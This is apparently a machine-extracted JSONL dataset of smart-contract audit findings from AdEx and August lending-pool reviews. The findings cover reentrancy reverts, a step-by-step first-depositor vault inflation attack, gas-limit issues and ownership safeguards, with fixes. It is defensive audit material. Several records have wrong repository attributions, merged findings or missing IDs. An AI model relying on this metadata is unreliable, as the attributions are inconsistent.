check than it takes to perform a \"less than\" check. ✓ Resolved in commit [\\[46a8e48\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/46a8e48ec2817e1b0f6b333a0f075d8a318e6761)\n- **Gas Saving Public Functions** In AdExCore.sol , the following functions can be declared external instead of public to save gas: channelOpen , channelWithdraw and channelWithdrawExpired .\n- **Comment Inaccuracy** In MerkleProof.sol line [7], developer comment notes the future need to *\"compare valueHash == root if the proof is empty?\"*. This is not necessary as this base case is already handled by the function. A merkle tree with only 1 leaf uses the leaf as the root itself. ✓ Resolved in commit [\\[caa872c\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/caa872ce982cd09a342b42d10281bf82038e6070)\n- **Comment Inaccuracy** In SafeERC20.sol line [10], developer comment suggests the checkSuccess() function is *\"definitely not a pure fn but the compiler complains otherwise\"*. This function is indeed a pure function as the assembly doesn't include any impure opcode (see a non-exhaustive list [\\[3\\]](#page-14-3)). ✓ Resolved in commit [\\[caa872c\\]](https://github.com/AdExNetwork/adex-protocol-eth/commit/caa872ce982cd09a342b42d10281bf82038e6070)\n\n### **Recommendations**\n\nEnsure these are as expected.\n\n#### **Resolution**\n\nThe items listed above have been resolved, with the exception of the \"Gas Saving - Public Functions\". See related response below from the development team:\n\n*\"Everything addressed in latest master except \"gas saving - public functions\". Using \"external\" causes various types of issues related to the new ABIEncoderv2 within the solidity/ethereum ecosystem; the most prominent one we encountered was the C++ version of solc v0.4.25 crashing with a segfault when the functions are external; this has not*\n\n\n\n*happened ever since we simplified a particular function signature, but still, truffle test fails with an obscure solc JS error when we try to change it now; should be investigated further\".*\n", "severity": "Informational", "difficulty": "Low", "type": null, "finding_id": "ADX-04", "target": {"path": "All Contracts in Scope", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/AdExNetwork/adex-protocol-eth", "org": "AdExNetwork", "name": "adex-protocol-eth", "commit": "da725ba15a77712cd8b5d175097114432d920174", "branch": null, "relative_file": "All Contracts in Scope", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:04:48.733506+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:48.735249+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Asset": "All Contracts in Scope", "Status": "Resolved: See inline comments and Resolution", "Rating": "Informational", "Finding ID": "ADX-04", "Target": "All Contracts in Scope"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-001", "doc_id": "sigmaprime_august_review", "finding_index": 1, "page_start": 7, "title": "Two nonReentrancy Modifiers Prevent liquidate() Execution", "short_summary": null, "description_md": "#### **Description**\n\nTwo nonReentrant modifiers are executed in a single call, causing ReentrancyGuard to revert during liquidate() .\n\nWhen the function AbstractLender.liquidate() is called, the following call sequence occurs.\n\n- 1. AbstractLender.liquidate() is called on the lender contract. The function has a nonReentrant modifier. At this point, \\_reentrancyStatus is set to \\_REENTRANCY\\_ENTERED .\n- 2. IPeerToPeerOpenTermLoan(loanAddr).liquidate() is called on the respective loan contract. This code may execute InitializableOpenTermLoan.liquidate() .\n- 3. IHookableLender(lender).notifyLoanMatured() is called on the lender contract. The function has a nonReentrant modifier as described in HookableLender.sol .\n\nSince the \\_reentrancyStatus of the lender contract was already set to \\_REENTRANCY\\_ENTERED in step (1), the call in step (3) would cause a revert on BaseReentrancyGuard.\\_nonReentrantBefore() . The result is, AbstractLender.liquidate() will revert.\n\nThe impact is rated as medium severity as being unable to call liquidate() prevents losses being accounted for at the pool level.\n", "full_markdown": "| AUG-01                                 | Two nonReentrancy Modifiers Prevent liquidate() Execution |                |                  |\n|----------------------------------------|-----------------------------------------------------------|----------------|------------------|\n| Asset pools/base/AbstractLender.sol |                                                           |                |                  |\n| Status                                 | Resolved: See Resolution                                  |                |                  |\n| Rating                                 | Severity: High                                            | Impact: Medium | Likelihood: High |\n\n#### **Description**\n\nTwo nonReentrant modifiers are executed in a single call, causing ReentrancyGuard to revert during liquidate() .\n\nWhen the function AbstractLender.liquidate() is called, the following call sequence occurs.\n\n- 1. AbstractLender.liquidate() is called on the lender contract. The function has a nonReentrant modifier. At this point, \\_reentrancyStatus is set to \\_REENTRANCY\\_ENTERED .\n- 2. IPeerToPeerOpenTermLoan(loanAddr).liquidate() is called on the respective loan contract. This code may execute InitializableOpenTermLoan.liquidate() .\n- 3. IHookableLender(lender).notifyLoanMatured() is called on the lender contract. The function has a nonReentrant modifier as described in HookableLender.sol .\n\nSince the \\_reentrancyStatus of the lender contract was already set to \\_REENTRANCY\\_ENTERED in step (1), the call in step (3) would cause a revert on BaseReentrancyGuard.\\_nonReentrantBefore() . The result is, AbstractLender.liquidate() will revert.\n\nThe impact is rated as medium severity as being unable to call liquidate() prevents losses being accounted for at the pool level.\n\n#### **Recommendations**\n\nConsider removing one of the nonReentrant modifiers either on AbstractLender or HookableLender contract.\n\n#### **Resolution**\n\nThe issue was resolved on commit [2196d53.](https://github.com/fractal-protocol/august-contracts-upgradeable/commit/2196d5357aad71eaf2dcfc6bbff8a4f6d69c59cc) The nonReentrant modifier on AbstractLender.liquidate() was removed.\n\n\n\n\n| AUG-02 Restricted Token Redeem Period When lagDuration == 0 |                                 |                |                    |\n|-------------------------------------------------------------------|---------------------------------|----------------|--------------------|\n| Asset                                                             | pool/base/TimelockedERC4626.sol |                |                    |\n| Status                                                            | Resolved: See Resolution        |                |                    |\n| Rating                                                            | Severity: Medium                | Impact: Medium | Likelihood: Medium |\n\n### **Description**\n\nIf lagDuration == 0 , users may have only a limited period, potentially just 1 hour in a day, to claim their token.\n\nWhen lagDuration == 0 , the pool is not time-locked. Therefore, users are supposed to redeem their tokens instantly. However, this is not the case, as the redeem phase still depends on the liquidationHour . Indeed, when lagDuration == 0 , the function requestRedeem() calls the internal function \\_claim() in the following code from lines [**130-133**]:\n\n```\nif (lagDuration == 0) {\n     claimableEpoch = block.timestamp;\n     _claim(year, month, day, 0, receiverAddr);\n}\n```\n\nIf the call happens before the liquidationHour , the call will revert because of the require statement on line [**428**]:\n\n```\nrequire(block.timestamp + _TIMESTAMP_MANIPULATION_WINDOW >= DateUtils.timestampFromDateTime(year, month, day, liquidationHour, 0,\n      ,→ 0), \"Too early\");\n```\n\nHence, the current timestamp is checked with year , month , day and the liquidationHour . For example, when liquidationHour = 23 , users would have only 1 hour a day, just between *11:00 PM UTC and 11:59 PM UTC*, to redeem their tokens.\n\n#### **Recommendations**\n\nUpdate the liquidationHour to 0 , when updating the lagDuration to 0 in the function updateTimelockDuration() . Also, consider reverting if there is a call to update the liquidationHour to a value other than 0 when lagDuration == 0 in the function updateProcessingHour() .\n\n# **Resolution**\n\nThe development team has fixed this issue in commit [d510a02,](https://github.com/fractal-protocol/august-contracts-upgradeable/commit/d510a02b3b9932638f782bc3543564a1d8dfdf61) by adding the following the require statement when the lagDuration > 0 .\n\n```\nrequire(block.timestamp + _TIMESTAMP_MANIPULATION_WINDOW >= DateUtils.timestampFromDateTime(year, month, day, liquidationHour, 0,\n      ,→ 0), \"Too early\");\n```\n", "severity": "High", "difficulty": "High", "type": null, "finding_id": "AUG-01", "target": {"path": "Asset pools/base/AbstractLender.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/fractal-protocol/august-contracts-upgradeable", "org": "fractal-protocol", "name": "august-contracts-upgradeable", "commit": "492389005a2146d649ca835c6b5f649848a8b86a", "branch": null, "relative_file": "Asset pools/base/AbstractLender.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "High", "Difficulty": "High", "Impact": "Medium", "Likelihood": "High", "Finding ID": "AUG-01", "Target": "Asset pools/base/AbstractLender.sol", "Status": "Resolved", "Asset": "Asset pools/base/AbstractLender.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-002", "doc_id": "sigmaprime_august_review", "finding_index": 2, "page_start": 9, "title": "Inflation Attack On Empty Vault Can DoS The Vault", "short_summary": null, "description_md": "#### **Description**\n\nThe first depositor may execute an inflation attack to prevent other users from depositing.\n\nA malicious first depositor can inflate the rate between the shares and assets. This can be done by first depositing the lowest possible amount of supported assets to the vault, then transferring a large amount of assets to the vault contract directly without calling deposit() or mint() . The asset transfer will artificially inflate the share price for future depositors. If their deposited amount is less than a specific value, legitimate users cannot deposit due to the check statement on line [**100**] because their shares will be 0 due to the share price inflation.\n\nConsider the following attack scenario:\n\n- 1. First we assume that the vault is freshly generated.\n- 2. The attacker deposits 1 asset by calling deposit(1) . Thus, totalAssets()==1 , totalSupply()==1 .\n- 3. The attacker inflates the rate by transferring the underlying asset directly to the vault. Let us assume they transfer 10\\_000e6 - 1 . Now we have totalAssets() == 10\\_000e6 and totalSupply() == 1 .\n- 4. At this point, legitimate users cannot deposit an amount less than 10\\_000e6 . This is because if the deposited amount is less than 10\\_000e6 , the expected shares will be zero, since shares = totalSupply \\* depositedAmount / totalAssets , and therefore we have shares = 1 \\* depositedAmount / 10\\_000e6 which yields zero shares.\n", "full_markdown": "| AUG-03                                         | Inflation Attack On Empty Vault Can DoS The Vault |              |                 |\n|------------------------------------------------|---------------------------------------------------|--------------|-----------------|\n| Asset pools/base/BaseUpgradeableERC4626.sol |                                                   |              |                 |\n| Status                                         | Resolved: See Resolution                          |              |                 |\n| Rating                                         | Severity: Medium                                  | Impact: High | Likelihood: Low |\n\n#### **Description**\n\nThe first depositor may execute an inflation attack to prevent other users from depositing.\n\nA malicious first depositor can inflate the rate between the shares and assets. This can be done by first depositing the lowest possible amount of supported assets to the vault, then transferring a large amount of assets to the vault contract directly without calling deposit() or mint() . The asset transfer will artificially inflate the share price for future depositors. If their deposited amount is less than a specific value, legitimate users cannot deposit due to the check statement on line [**100**] because their shares will be 0 due to the share price inflation.\n\nConsider the following attack scenario:\n\n- 1. First we assume that the vault is freshly generated.\n- 2. The attacker deposits 1 asset by calling deposit(1) . Thus, totalAssets()==1 , totalSupply()==1 .\n- 3. The attacker inflates the rate by transferring the underlying asset directly to the vault. Let us assume they transfer 10\\_000e6 - 1 . Now we have totalAssets() == 10\\_000e6 and totalSupply() == 1 .\n- 4. At this point, legitimate users cannot deposit an amount less than 10\\_000e6 . This is because if the deposited amount is less than 10\\_000e6 , the expected shares will be zero, since shares = totalSupply \\* depositedAmount / totalAssets , and therefore we have shares = 1 \\* depositedAmount / 10\\_000e6 which yields zero shares.\n\n#### **Recommendations**\n\nThe simplest countermeasure to inflation attacks is ensuring that the vault is never empty. This can be achieved by depositing into the vault in the deployment/initialisation script.\n\n#### **Resolution**\n\nThe development team has confirmed that they are going to manually perform the first deposit into the vault.\n\n\n\n\n| AUG-04 Recent Solidity Versions May Not Be Supported By Layer 2 Systems |                  |              |                 |\n|----------------------------------------------------------------------------|------------------|--------------|-----------------|\n| Asset                                                                      | src/*.sol        |              |                 |\n| Resolved: See Resolution Status                                         |                  |              |                 |\n| Rating                                                                     | Severity: Medium | Impact: High | Likelihood: Low |\n\n#### **Description**\n\nSolidity versions starting from 0.8.25 use the MCOPY op-code by default. The op-code MCOPY will cause a revert if it is called on chains that are not upgraded to the EVM version *Cancun*. The Solidity operations that include the MCOPY by default:\n\n- The helper function abi.encode() ;\n- Functions which return byte array;\n- Functions which return string types.\n\nThe testing team has compiled the contract and discovered occurrences of MCOPY in the bytecode.\n\nThe impact of deploying the contract on chains that do not upgrade their EVM to *Cancun* is high. This is because the funds can be stuck. MCOPY will not be used when depositing funds allowing funds to enter the protocol. However, when trying to redeem, the transaction will revert since the function \\_registerRedeemRequest() contains an abi.encode() instruction which uses MCOPY by default.\n\n#### **Recommendations**\n\nConsider setting the Solidity compile flag --evm-version such that it is an earlier EVM version. paris is a good choice for the EVM version as it does not contain either PUSH0 or MCOPY opcodes.\n\nAlternatively, using a compiler version which is strictly less < 0.8.25 .\n\nNote that shanghai (the default in Solidity from 0.8.20 to 0.8.24 ) introduces the opcode PUSH0 which may or may not be supported by other chains.\n\nFurthermore, validate the EVM version of each chain before compiling contracts and deploying to that chain.\n\n#### **Resolution**\n\nThe development team are resolving the issue by setting the EVM version to Paris during compilation.\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": "pools/base/BaseUpgradeableERC4626.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/fractal-protocol/august-contracts-upgradeable", "org": "fractal-protocol", "name": "august-contracts-upgradeable", "commit": "2196d5357aad71eaf2dcfc6bbff8a4f6d69c59cc", "branch": null, "relative_file": "pools/base/BaseUpgradeableERC4626.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Impact": "High", "Likelihood": "Low", "Finding ID": null, "Target": "pools/base/BaseUpgradeableERC4626.sol", "Status": "Resolved", "Asset": "pools/base/BaseUpgradeableERC4626.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-003", "doc_id": "sigmaprime_august_review", "finding_index": 3, "page_start": 11, "title": "Index Swapping May Prevent Subsequent Calls To claim()", "short_summary": null, "description_md": "### **Description**\n\nThe internal function \\_deleteReceiver() swaps the index of a receiver address with the last item, if the index is not the last item.\n\nThis algorithm is commonly used in Solidity as a cost-effective solution for removing an array item. However, since receiverIndex is used as one of the inputs in the claim() function, the index swapping could cause a revert if there are subsequent calls to claim() .\n\nConsider the following mock case. Let us assume there are ten users who wish to withdraw at the same time.\n\n- 1. First, they will query their respective receiverIndex through the getReceiverIndex() function.\n- 2. Using this information, each user calls claim() . Ten transactions are created almost at the same time.\n- 3. We assume that the first user's transaction is successful. At this point, the last item is swapped to be the first item in the array.\n- 4. If the last user's transaction is executed, this transaction reverts with an Invalid receiver index message.\n", "full_markdown": "| AUG-05 | Index Swapping May Prevent Subsequent Calls To claim() |             |                    |\n|--------|--------------------------------------------------------|-------------|--------------------|\n| Asset  | pools/base/TimelockedERC4626.sol                       |             |                    |\n| Status | Resolved: See Resolution                               |             |                    |\n| Rating | Severity: Low                                          | Impact: Low | Likelihood: Medium |\n\n### **Description**\n\nThe internal function \\_deleteReceiver() swaps the index of a receiver address with the last item, if the index is not the last item.\n\nThis algorithm is commonly used in Solidity as a cost-effective solution for removing an array item. However, since receiverIndex is used as one of the inputs in the claim() function, the index swapping could cause a revert if there are subsequent calls to claim() .\n\nConsider the following mock case. Let us assume there are ten users who wish to withdraw at the same time.\n\n- 1. First, they will query their respective receiverIndex through the getReceiverIndex() function.\n- 2. Using this information, each user calls claim() . Ten transactions are created almost at the same time.\n- 3. We assume that the first user's transaction is successful. At this point, the last item is swapped to be the first item in the array.\n- 4. If the last user's transaction is executed, this transaction reverts with an Invalid receiver index message.\n\n## **Recommendations**\n\nThe receiverIndex information can be cheaply computed onchain if the basic array is replaced with alternative solutions such as OpenZeppelin's [EnumerableSet.](https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet)\n\n## **Resolution**\n\nThe development team has resolved this issue by extracting the value of receiverIndex on-chain in the \\_claim() function, through the receiverAddr by using a new mapping \\_receiverIndexes .\n", "severity": "Low", "difficulty": "High", "type": null, "finding_id": "AUG-05-INDEX-SWAP-CLAIM-REVERT", "target": {"path": "pools/base/TimelockedERC4626.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/fractal-protocol/august-contracts-upgradeable", "org": "fractal-protocol", "name": "august-contracts-upgradeable", "commit": "2196d5357aad71eaf2dcfc6bbff8a4f6d69c59cc", "branch": null, "relative_file": "pools/base/TimelockedERC4626.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Impact": "Low", "Likelihood": "Medium", "Finding ID": "AUG-05-INDEX-SWAP-CLAIM-REVERT", "Target": "pools/base/TimelockedERC4626.sol", "Status": "Resolved: See Resolution", "Asset": "pools/base/TimelockedERC4626.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-004", "doc_id": "sigmaprime_august_review", "finding_index": 4, "page_start": 12, "title": "Excessive Redeem Requests May Cause processAllClaimsByDate() to Revert", "short_summary": null, "description_md": "### **Description**\n\nUsers can submit a large number of redeem requests on the same day. This could prevent a successful call to processAllClaimsByDate() if the call breaches the block gas limit.\n\nThe function processAllClaimsByDate() loops through all redeem requests for a single day. If the number of requests is too large, the result is excessive gas consumption potentially larger than the block gas limit.\n\nGas limit tests indicate that the block gas limit will be breached when there are roughly 1,000 redeem requests.\n\nConsequently, users may need to call the claim() function for individual requests.\n", "full_markdown": "| AUG-06                                    | Excessive Redeem Requests May Cause processAllClaimsByDate() to Revert |             |                 |\n|-------------------------------------------|------------------------------------------------------------------------|-------------|-----------------|\n| Asset pools/base/TimelockedERC4626.sol |                                                                        |             |                 |\n| Status                                    | Resolved: See Resolution                                               |             |                 |\n| Rating                                    | Severity: Low                                                          | Impact: Low | Likelihood: Low |\n\n### **Description**\n\nUsers can submit a large number of redeem requests on the same day. This could prevent a successful call to processAllClaimsByDate() if the call breaches the block gas limit.\n\nThe function processAllClaimsByDate() loops through all redeem requests for a single day. If the number of requests is too large, the result is excessive gas consumption potentially larger than the block gas limit.\n\nGas limit tests indicate that the block gas limit will be breached when there are roughly 1,000 redeem requests.\n\nConsequently, users may need to call the claim() function for individual requests.\n\n#### **Recommendations**\n\nConsider adding a limit as an input to the processAllClaimsByDate() function so that requests can be processed in multiple batches when needed. Also, consider adding a minimum withdrawal to prevent dust amounts from being withdrawn.\n\n#### **Resolution**\n\nThe first recommendation has been implemented in commit [d510a02.](https://github.com/fractal-protocol/august-contracts-upgradeable/commit/d510a02b3b9932638f782bc3543564a1d8dfdf61) The function processAllClaimsByDate() now has an argument maxLimit which represent the number of request to process for a dailyCluster .\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": "pools/base/TimelockedERC4626.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/fractal-protocol/august-contracts-upgradeable", "org": "fractal-protocol", "name": "august-contracts-upgradeable", "commit": "2196d5357aad71eaf2dcfc6bbff8a4f6d69c59cc", "branch": null, "relative_file": "pools/base/TimelockedERC4626.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Impact": "Low", "Likelihood": "Low", "Finding ID": null, "Target": "pools/base/TimelockedERC4626.sol", "Status": "Resolved", "Asset": "pools/base/TimelockedERC4626.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-005", "doc_id": "sigmaprime_august_review", "finding_index": 5, "page_start": 13, "title": "Potentially Inefficient Search On getReceiverIndex()", "short_summary": null, "description_md": "### **Description**\n\nThe code on lines [**336-338**] uses a basic loop to find the index in the array that contains an address. The gas cost of the query increases proportionally with the number of requests. The case of significant gas cost may arise deliberately or maliciously, if there are numerous requests with different receiverAddr values received by the contract in one day.\n\nIt is also worth noting that if there are multiple requests with the same receiverAddr , this query only returns the first request in the array.\n", "full_markdown": "| AUG-07 | Potentially Inefficient Search On getReceiverIndex() |\n|--------|------------------------------------------------------|\n| Asset  | pools/base/TimelockedERC4626.sol                     |\n| Status | Resolved: See Resolution                             |\n| Rating | Informational                                        |\n\n### **Description**\n\nThe code on lines [**336-338**] uses a basic loop to find the index in the array that contains an address. The gas cost of the query increases proportionally with the number of requests. The case of significant gas cost may arise deliberately or maliciously, if there are numerous requests with different receiverAddr values received by the contract in one day.\n\nIt is also worth noting that if there are multiple requests with the same receiverAddr , this query only returns the first request in the array.\n\n#### **Recommendations**\n\nTo improve the efficiency of the search mechanism, consider implementing OpenZeppelin's [EnumerableSet](https://docs.openzeppelin.com/contracts/3.x/api/utils#EnumerableSet) to store addresses.\n\n## **Resolution**\n\nThe function getReceiverIndex() has been removed in commit [d510a02](https://github.com/fractal-protocol/august-contracts-upgradeable/commit/d510a02b3b9932638f782bc3543564a1d8dfdf61) and it is replaced by mapping \\_receiverIndexes which stores the index of each unique receiver per cluster.\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "AUG-07", "target": {"path": "pools/base/TimelockedERC4626.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": "pools/base/TimelockedERC4626.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Impact": "Informational", "Likelihood": "Medium", "Finding ID": "AUG-07", "Target": "pools/base/TimelockedERC4626.sol", "Status": "Resolved: See Resolution", "Asset": "pools/base/TimelockedERC4626.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-006", "doc_id": "sigmaprime_august_review", "finding_index": 6, "page_start": 14, "title": "Potential Double Funding Of Loan Contracts", "short_summary": null, "description_md": "### **Description**\n\nThe fundLoan() function in BaseLendingPool does not perform a pre-check on the loan state to ensure that it requires funding.\n\n```\nfunction fundLoan(address loanAddr) external override onlyIfInitialized nonReentrant ifConfigured onlyLoansOperator {\n// ... existing code ...\n    IPeerToPeerOpenTermLoan(loanAddr).fundLoan();\n// Post checks\n    require(IPeerToPeerOpenTermLoan(loanAddr).loanState() == LOAN_ACTIVE, \"Funding check failed\");\n// ... other checks ...\n}\n```\n\nWhile there is a post-funding check to ensure the loan is active, there is no pre-funding verification that the loan requires funding.\n\nThe issue is raised as informational severity, as the check is performed in InitializableOpenTermLoan . If other implementations of IPeerToPeerOpenTermLoan do not implement the check, double funding could be possible.\n", "full_markdown": "| AUG-08 | Potential Double Funding Of Loan Contracts |\n|--------|--------------------------------------------|\n| Asset  | pools/base/BaseLendingPool.sol             |\n| Status | Resolved: See Resolution                   |\n| Rating | Informational                              |\n\n### **Description**\n\nThe fundLoan() function in BaseLendingPool does not perform a pre-check on the loan state to ensure that it requires funding.\n\n```\nfunction fundLoan(address loanAddr) external override onlyIfInitialized nonReentrant ifConfigured onlyLoansOperator {\n// ... existing code ...\n    IPeerToPeerOpenTermLoan(loanAddr).fundLoan();\n// Post checks\n    require(IPeerToPeerOpenTermLoan(loanAddr).loanState() == LOAN_ACTIVE, \"Funding check failed\");\n// ... other checks ...\n}\n```\n\nWhile there is a post-funding check to ensure the loan is active, there is no pre-funding verification that the loan requires funding.\n\nThe issue is raised as informational severity, as the check is performed in InitializableOpenTermLoan . If other implementations of IPeerToPeerOpenTermLoan do not implement the check, double funding could be possible.\n\n#### **Recommendations**\n\nConsider adding a pre-funding check in fundLoan() to ensure the loan state is LOAN\\_FUNDING\\_REQUIRED before proceeding with the funding operation.\n\nNote that this check would increase gas costs in making an additional call to the loanAddr .\n\n#### **Resolution**\n\nThe recommended check has been implemented in commit [d510a02.](https://github.com/fractal-protocol/august-contracts-upgradeable/commit/d510a02b3b9932638f782bc3543564a1d8dfdf61)\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": "pools/base/BaseLendingPool.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": "pools/base/BaseLendingPool.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "review.pdf", "source_mtime": "2025-11-10T12:08:24+00:00", "report_extracted_at": "2025-11-12T02:05:40.857352+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:05:40.860063+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Impact": "Informational", "Likelihood": null, "Finding ID": null, "Target": "pools/base/BaseLendingPool.sol", "Status": "Resolved: See Resolution", "Asset": "pools/base/BaseLendingPool.sol"}}
{"schema_version": "0.1", "scvd_id": "SCVD-sigmaprime_august_review-007", "doc_id": "sigmaprime_august_review", "finding_index": 7, "page_start": 15, "title": "Ownership Mechanism Lacks Additional Safeguards", "short_summary": null, "description_md": "### **Description**\n\nThe BaseOwnable and LendingPool contracts implement a basic ownership mechanism. While functional, it lacks safeguards against accidental transfers to invalid addresses.\n\nThe current transfer of ownership pattern calls the function transferOwnership(address newOwner) which instantly changes the owner to the newOwner . This allows the current owner of the contracts to set an arbitrary address.\n\nIf the address is entered incorrectly, the owner role of the contract is lost forever. Thus, a user would not be able to pass the onlyOwner modifier.\n", "full_markdown": "| AUG-09 | Ownership Mechanism Lacks Additional Safeguards |\n|--------|-------------------------------------------------|\n| Asset  | core/BaseOwnable.sol & pools/LendingPool.sol    |\n| Status | Closed: See Resolution                          |\n| Rating | Informational                                   |\n\n### **Description**\n\nThe BaseOwnable and LendingPool contracts implement a basic ownership mechanism. While functional, it lacks safeguards against accidental transfers to invalid addresses.\n\nThe current transfer of ownership pattern calls the function transferOwnership(address newOwner) which instantly changes the owner to the newOwner . This allows the current owner of the contracts to set an arbitrary address.\n\nIf the address is entered incorrectly, the owner role of the contract is lost forever. Thus, a user would not be able to pass the onlyOwner modifier.\n\n# **Recommendations**\n\nThis scenario is typically mitigated by implementing a two-step transfer pattern, whereby a new owner address is selected, then the selected address must call an acceptOwnership() before the owner is changed. This ensures the new owner address is accessible.\n\nConsider adopting OpenZeppelin's [Ownable2Step](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/e3786e63e6def6f3b71ce7b4b30906123bffe67c/contracts/access/Ownable2Step.sol) pattern or implementing a similar two-step ownership transfer process.\n\n# **Resolution**\n\nThe development has decided not to fix the issue. They mentioned that the owner will be protected by a multi-sig account.\n", "severity": "Informational", "difficulty": "High", "type": null, "finding_id": "AUG-09", "target": {"path": "core/BaseOwnable.sol & pools/LendingPool.sol", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/OpenZeppelin/openzeppelin-contracts", "org": "OpenZeppelin", "name": "openzeppelin-contracts", "commit": "e3786e63e6def6f3b71ce7b4b30906123bffe67c", "branch": null, "relative_file": "core/BaseOwnable.sol & pools/LendingPool.sol", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, 